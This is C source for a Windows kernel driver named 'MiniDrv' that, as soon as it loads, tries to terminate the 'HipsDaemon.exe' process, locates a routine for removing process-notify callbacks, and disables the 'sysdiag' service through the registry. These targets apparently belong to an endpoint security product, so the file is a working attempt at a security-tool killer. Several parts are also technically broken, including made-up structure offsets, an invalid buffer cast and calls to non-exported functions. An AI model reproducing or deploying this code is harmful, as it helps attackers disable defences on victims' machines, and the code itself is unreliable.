#include <ntddk.h>

#define EPROCESS_ACTIVEPROCESSLINKS 0x2f0
#define EPROCESS_UNIQUEPROCESSID    0x2e0
#define EPROCESS_TERMINATED         0x2b0
#define PSDRIVERENTRY_LIST_HEAD     0x18

typedef NTSTATUS(*PFN_CmUnRegisterCallback)(LPCALLBACK_OBJECT CallbackObject);
typedef VOID(*PFN_PsRemoveProcessNotifyRoutine)(PCALLBACK_ROUTINE CallbackRoutine, BOOLEAN RemoveFromList);

PFN_CmUnRegisterCallback g_CmUnRegisterCallback = NULL;
PFN_PsRemoveProcessNotifyRoutine g_PsRemoveProcessNotifyRoutine = NULL;

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("MiniDrv: Unload\r\n");
}

NTSTATUS ForceKillProcessByPid(HANDLE pid)
{
    NTSTATUS status;
    PEPROCESS pEprocess = NULL;

    status = PsLookupProcessByProcessId(pid, &pEprocess);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: PsLookupProcessByProcessId fail %08X\r\n", status);
        return status;
    }

    *(BOOLEAN*)((PUCHAR)pEprocess + EPROCESS_TERMINATED) = TRUE;
    DbgPrint("MiniDrv: Set Terminated for PID=%d\r\n", HandleToUlong(pid));

    ObDereferenceObject(pEprocess);
    return STATUS_SUCCESS;
}

VOID EnumAndKillHipsDaemon()
{
    PLIST_ENTRY pListHead, pCurEntry;
    PEPROCESS pEproc;
    UNICODE_STRING targetName;
    WCHAR imgBuf[256];

    RtlInitUnicodeString(&targetName, L"HipsDaemon.exe");
    pListHead = PsGetProcessList();
    pCurEntry = pListHead->Flink;

    while (pCurEntry != pListHead)
    {
        pEproc = CONTAINING_RECORD(pCurEntry, EPROCESS, ActiveProcessLinks);
        HANDLE pid = *(HANDLE*)((PUCHAR)pEproc + EPROCESS_UNIQUEPROCESSID);

        RtlZeroMemory(imgBuf, sizeof(imgBuf));
        RtlCopyUnicodeString((PUNICODE_STRING)imgBuf, PsGetProcessImageFileName(pEproc));

        if (RtlCompareUnicodeString((PUNICODE_STRING)imgBuf, &targetName, TRUE) == 0)
        {
            DbgPrint("MiniDrv: Found HipsDaemon PID=%d, killing...\r\n", HandleToUlong(pid));
            ForceKillProcessByPid(pid);
        }
        pCurEntry = pCurEntry->Flink;
    }
}

NTSTATUS DisableSysdiagService()
{
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING keyPath, valueName;
    HANDLE hKey;
    ULONG disableStart = 4;

    RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\sysdiag");
    InitializeObjectAttributes(&objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenKey(&hKey, KEY_WRITE, &objAttr);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: ZwOpenKey failed %08X\r\n", status);
        return status;
    }

    RtlInitUnicodeString(&valueName, L"Start");
    status = ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &disableStart, sizeof(ULONG));
    if (NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: Set sysdiag Start=4 SUCCESS\r\n");
    }
    else
    {
        DbgPrint("MiniDrv: ZwSetValueKey fail %08X\r\n", status);
    }
    ZwClose(hKey);
    return STATUS_SUCCESS;
}

VOID TryRemoveSysdiagCallback()
{
    UNICODE_STRING routineName;
    RtlInitUnicodeString(&routineName, L"PsRemoveProcessNotifyRoutine");

    g_PsRemoveProcessNotifyRoutine = (PFN_PsRemoveProcessNotifyRoutine)MmGetSystemRoutineAddress(&routineName);
    if (g_PsRemoveProcessNotifyRoutine != NULL)
    {
        DbgPrint("MiniDrv: PsRemoveProcessNotifyRoutine found\r\n");
        // g_PsRemoveProcessNotifyRoutine(SysdiagCallbackAddr, TRUE);
    }
    else
    {
        DbgPrint("MiniDrv: PsRemoveProcessNotifyRoutine NOT FOUND\r\n");
    }
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;
    DbgPrint("==== MiniDrv Loaded ====\r\n");

    EnumAndKillHipsDaemon();

    TryRemoveSysdiagCallback();

    DisableSysdiagService();

    DbgPrint("==== MiniDrv Work Done ====\r\n");
    return STATUS_SUCCESS;
}
